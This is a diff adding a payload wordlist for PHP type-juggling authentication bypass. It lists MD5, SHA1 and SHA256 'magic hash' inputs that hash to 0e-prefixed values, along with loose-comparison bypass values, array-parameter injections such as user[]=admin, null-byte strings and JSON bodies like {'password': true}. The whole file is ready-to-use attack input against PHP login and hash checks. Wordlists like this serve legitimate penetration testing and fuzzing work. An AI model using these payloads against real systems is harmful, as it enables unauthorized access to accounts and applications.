@@ -1,0 +1,64 @@
+# PHP Type Juggling Magic Hashes
+# These strings hash to values starting with 0e (scientific notation)
+# In loose comparison (==), 0e... == 0 is TRUE
+
+# MD5 Magic Hashes (hash starts with 0e followed by only digits)
+240610708
+QNKCDZO
+0e215962017
+aabg7XSs
+aabC9RqS
+0e1137126905
+0e462097431906509019562988736854
+0e830400451993494058024219903391
+
+# SHA1 Magic Hashes
+10932435112
+aaroZmOk
+aaK1STfY
+aaO8zKZF
+aa3OFF9m
+
+# SHA256 Magic Hashes
+34250003024812
+TyNOQHUS
+
+# Common bypass values for loose comparison
+0
+00
+0.0
+0e0
+0e1
+0e000000000000000000000000000000
+0e462097431906509019562988736854
+0E215962017
+true
+false
+null
+[]
+{}
+
+# String to integer conversion bypasses
+0 but true
+0e
+0x0
+0b0
+
+# Array bypass (PHP treats [] differently)
+password[]
+password[]=
+user[]=admin
+
+# NULL byte injection
+%00
+\x00
+
+# Boolean bypass
+1
+0
+
+# JSON type confusion
+{"password": true}
+{"password": 0}
+{"password": null}
+{"password": []}
